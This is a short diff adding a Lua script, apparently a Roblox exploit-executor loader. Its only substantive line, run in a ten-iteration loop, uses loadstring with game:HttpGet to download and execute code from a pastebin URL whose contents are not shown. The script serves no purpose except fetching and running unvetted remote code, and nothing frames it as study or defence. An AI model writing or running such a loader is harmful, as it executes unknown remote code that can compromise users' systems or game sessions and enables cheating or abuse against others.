@@ -1,0 +1,8 @@
+-- Define the number of times to loop
+local numLoops = 10
+
+-- Loop and execute the code multiple times
+for i = 1, numLoops do
+    loadstring(game:HttpGet("https://pastebin.com/raw/KhYXMwvB"))()
+
+end
